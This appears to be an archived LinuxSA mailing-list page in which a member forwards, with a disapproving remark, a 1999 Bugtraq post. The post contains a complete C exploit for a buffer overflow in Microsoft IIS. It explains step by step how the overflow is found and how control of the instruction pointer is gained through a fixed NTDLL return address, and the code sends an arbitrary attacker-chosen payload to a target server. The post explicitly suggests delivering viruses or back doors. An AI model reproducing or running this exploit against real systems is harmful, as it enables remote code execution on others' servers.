@@ -1,0 +1,268 @@
+<HTML>
+<!-- EmailData="Start" -->
+<!-- Version="1.1" -->
+<!-- Subject="Found this under Greg Hoglund in Netscape Search" -->
+<!-- FromName="'James Leone'" -->
+<!-- FromEmail="jleone@pacbell.net" -->
+<!-- ToName="'Romana Challans'" -->
+<!-- ToEmail="romana@timelady.com" -->
+<!-- Date="Thu, 06 Jun 2002 12:13:08 -0700" -->
+<!-- Id="" -->
+<!-- Reference="20020606125703.O91694-100000@hamish.internode.com.au" -->
+<!-- X-Face="" -->
+<!-- X-URL="" -->
+<!-- EmailData="End" -->
+<HEAD>
+<TITLE>LinuxSA Mailing List: Found this under Greg Hoglund in Netscape Search</TITLE>
+</HEAD>
+<BODY BGCOLOR=#FFFFFF><H1>LinuxSA Mailing list archives</H1>
+<!-- IndexControl1="Start" -->
+Index:
+[<A HREF="thread.html">thread</A>]
+[<A HREF="date.html">date</A>]
+[<A HREF="subject.html">subject</A>]
+[<A HREF="author.html">author</A>]
+[<A HREF="stats.html">stats</A>]
+<HR>
+<!-- IndexControl1="End" -->
+<!-- Header="Start" -->
+<PRE>
+  From: James Leone &lt;<I><A HREF="mailto:jleone@pacbell.net">jleone@pacbell.net</A></I>&gt;
+  To  : Romana Challans &lt;<I><A HREF="mailto:romana@timelady.com">romana@timelady.com</A></I>&gt;
+  Date: Thu, 06 Jun 2002 12:13:08 -0700
+</PRE>
+<H1>Found this under Greg Hoglund in Netscape Search</H1>
+<!-- Header="End" -->
+<!-- Body="Start" -->
+<PRE>
+Why do people waste their talent on this stuff?  Now I am embarrassed! :-[
+
+
+James Leone
+
+IIS Remote Exploit (injection code)
+
+--------------------------------------------------------------------------------
+
+To: <A HREF="mailto:BUGTRAQ@netspace.org">BUGTRAQ@netspace.org</A> 
+Subject: IIS Remote Exploit (injection code) 
+From: Greg Hoglund &lt;<A HREF="mailto:hoglund@IEWAY.COM">hoglund@IEWAY.COM</A>&gt; 
+Date: Wed, 16 Jun 1999 08:58:05 -0700 
+Approved-By: <A HREF="mailto:aleph1@UNDERGROUND.ORG">aleph1@UNDERGROUND.ORG</A> 
+Reply-To: Greg Hoglund &lt;<A HREF="mailto:hoglund@IEWAY.COM">hoglund@IEWAY.COM</A>&gt; 
+Sender: Bugtraq List &lt;<A HREF="mailto:BUGTRAQ@netspace.org">BUGTRAQ@netspace.org</A>&gt; 
+
+--------------------------------------------------------------------------------
+This works on about 20% of the hosts tested. 
+Two types of injection based attacks. 
+	1. Content-based: send content to be interpreted by an app server and we 
+bend its arm by saying "do this instead"
+	2. Buffer Overflow: process is no longer in control. You change
+the instruction pointer on the chip to point to your own code. 
+
+Simple:
+
+
+
+I read yesturday on eEye.com that they had discovered a buffer overflow in
+IIS.  I could not resist writing an exploit.  I did not have time to design
+a really cool payload for this exploit, so I simply wrote the injection
+code.  However, this is meaningful for several reasons.  Attached is the
+injection code.  The exploit will deliver any payload of your choosing.
+Your payload will be executed.  This empowers you to create a "collection"
+of payloads that are not dependant upon the injection vector in any way.
+This decoupling is important for military needs, where a single injection
+vector needs to work, but the "warhead" may be different depending on the
+targets characterization.
+
+The exploit was fairly simple to build.  In short, I read on eEye.com that
+they had overflowed IIS with something like a ~3000 character URL.  Within
+minutes I had caused IIS to crash with EIP under my control.  I used a
+special pattern in the buffer (see code) to make it easy for me to identify
+where EIP was being popped from.  The pattern also made it easy to
+determine where I was jumping around.  Use the tekneek Danielson. ;-)
+
+So, I controlled EIP, but I needed to get back to my stack segment, of
+course.  This is old school, and I really lucked out.  Pushed down two
+levels on the stack was an address for my buffer.  I couldn't have asked
+for more.  So, I found a location in NTDLL.DLL (0x77F88CF0) that I could
+return to.  It had two pop's followed by a return.  This made my injection
+vector return to the value that was stored two layers down on the stack.
+Bam, I was in my buffer.  So, I landed in a weird place, had to add a near
+jump to get to somewhere more useful.. nothing special, and here we are
+with about 2K of payload space.  If you don't supply any mobile code to be
+run, the injection vector will supply some for you.  The default payload in
+simply a couple of no-ops followed by a debug breakpoint (interrupt 3)...
+It's easy to play with if you want to build your own payloads.. just keep a
+debugger attached to inetinfo.exe on the target machine.
+
+Lastly, I would simply like to point out that monoculture installations are
+very dangerous.  It's a concept from agribusiness.. if you have all one
+crop, and a virus comes along that can kill that crop, your out of
+business.  With almost ALL of the IIS servers on the net being vulnerable
+to this exploit, we also have a monoculture.  And, it's not just IIS.  The
+backbone of the Internet is built on common router technology (such as
+cisco IOS).  If a serious exploit comes along for the IOS kernel, can you
+imagine the darkness that will fall?
+
+&lt;--- snip
+
+
+// IIS Injector for NT
+// written by Greg Hoglund &lt;<A HREF="mailto:hoglund@ieway.com">hoglund@ieway.com</A>&gt;
+// <A HREF="http://www.rootkit.com">http://www.rootkit.com</A>
+//
+// If you would like to deliver a payload, it must be stored in a binary file.
+// This injector decouples the payload from the injection code allowing you to
+// create a numnber of different attack payloads.  This code could be used,
+for
+// example, by a military that needs to attack IIS servers, and has
+characterized
+// the eligible hosts.  The proper attack can be chosen depending on needs.
+ Since
+// the payload is so large with this injection vector, many options are
+available.
+// First and foremost, virii can delivered with ease.  The payload is also
+plenty
+// large enough to remotely download and install a back door program.
+// Considering the monoculture of NT IIS servers out on the 'Net, this
+represents a
+// very serious security problem.
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;winsock.h&gt;
+
+void main(int argc, char **argv)
+{
+	SOCKET s = 0;
+	WSADATA wsaData;
+
+	if(argc &lt; 2)
+	{
+		fprintf(stderr, "IIS Injector for NT\nwritten by Greg Hoglund, " \
+                        " %s &lt;target" \
+						"ip&gt; &lt;optional payload file&gt;\n", argv[0]);
+		exit(0);
+	}
+
+	WSAStartup(MAKEWORD(2,0), &wsaData);
+
+	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+	if(INVALID_SOCKET != s)
+	{
+		SOCKADDR_IN anAddr;
+		anAddr.sin_family = AF_INET;
+		anAddr.sin_port = htons(80);
+		anAddr.sin_addr.S_un.S_addr = inet_addr(argv[1]);
+			
+		if(0 == connect(s, (struct sockaddr *)&anAddr, sizeof(struct sockaddr)))
+		{
+			static char theSploit[4096];
+			// fill pattern
+			char kick = 'z'; //0x7a
+			char place = 'A';
+
+			// my uber sweet pattern <A HREF="mailto:gener@t0r">gener@t0r</A>
+			for(int i=0;i&lt;4096;i+=4)
+			{
+				theSploit[i] = kick;
+				theSploit[i+1] = place;
+				theSploit[i+2] = place + 1;
+				theSploit[i+3] = place + 2;
+
+				if(++place == 'Y') // beyond 'XYZ'
+				{	
+					place = 'A';
+					if(--kick &lt; 'a') kick = 'a';
+				}
+			}
+
+			_snprintf(theSploit, 5, "get /");
+			_snprintf(theSploit + 3005, 22, "BBBB.htr HTTP/1.0\r\n\r\n\0");
+
+			// after crash, looks like inetinfo.exe is jumping to the address
+			// stored @ location 'GHtG' (0x47744847)
+			// cross reference back to the buffer pattern, looks like we need
+			// to store our EIP into theSploit[598]
+
+			// magic eip into NTDLL.DLL
+			theSploit[598] = (char)0xF0;
+			theSploit[599] = (char)0x8C;
+			theSploit[600] = (char)0xF8;
+			theSploit[601] = (char)0x77;
+			
+			// code I want to execute
+			// will jump foward over the
+			// embedded eip, taking us
+			// directly to the payload
+			theSploit[594] = (char)0x90;  //nop
+			theSploit[595] = (char)0xEB;  //jmp
+			theSploit[596] = (char)0x35;  //
+			theSploit[597] = (char)0x90;  //nop
+			
+			// the payload.  This code is executed remotely.
+			// if no payload is supplied on stdin, then this default
+			// payload is used.  int 3 is the debug interrupt and
+			// will cause your debugger to "breakpoint" gracefully.
+			// upon examiniation you will find that you are sitting
+			// directly in this code-payload.
+			if(argc &lt; 3)
+			{
+				theSploit[650] = (char) 0x90; //nop
+				theSploit[651] = (char) 0x90; //nop
+				theSploit[652] = (char) 0x90; //nop
+				theSploit[653] = (char) 0x90; //nop
+				theSploit[654] = (char) 0xCC; //int 3
+				theSploit[655] = (char) 0xCC; //int 3
+				theSploit[656] = (char) 0xCC; //int 3
+				theSploit[657] = (char) 0xCC; //int 3
+				theSploit[658] = (char) 0x90; //nop
+				theSploit[659] = (char) 0x90; //nop
+				theSploit[660] = (char) 0x90; //nop
+				theSploit[661] = (char) 0x90; //nop
+			}
+			else
+			{
+				// send the user-supplied payload from
+				// a file.  Yes, that's a 2K buffer for
+				// mobile code.  Yes, that's big.
+				FILE *in_file;
+				in_file = fopen(argv[2], "rb");
+				if(in_file)
+				{
+					int offset = 650;
+					while( (!feof(in_file)) && (offset &lt; 3000))
+					{
+						theSploit[offset++] = fgetc(in_file);
+					}
+					fclose(in_file);
+				}
+			}
+			send(s, theSploit, strlen(theSploit), 0);
+		}
+		closesocket(s);
+	}
+}
+
+
+
+-- 
+LinuxSA WWW: <A HREF="http://www.linuxsa.org.au/">http://www.linuxsa.org.au/</A>  IRC: #linuxsa on irc.linux.org.au
+To unsubscribe from the LinuxSA list:
+  mail <A HREF="mailto:linuxsa-request@linuxsa.org.au">linuxsa-request@linuxsa.org.au</A> with "unsubscribe" as the subject
+
+</PRE>
+<!-- Body="End" -->
+<!-- IndexControl2="Start" -->
+<HR>
+Index:
+[<A HREF="thread.html">thread</A>]
+[<A HREF="date.html">date</A>]
+[<A HREF="subject.html">subject</A>]
+[<A HREF="author.html">author</A>]
+[<A HREF="stats.html">stats</A>]
+<!-- IndexControl2="End" -->
+<HR><FONT SIZE=+1>Return to the <A HREF=/mailing-list/>LinuxSA Mailing List Information</A> Page</FONT></BODY>
+</HTML>
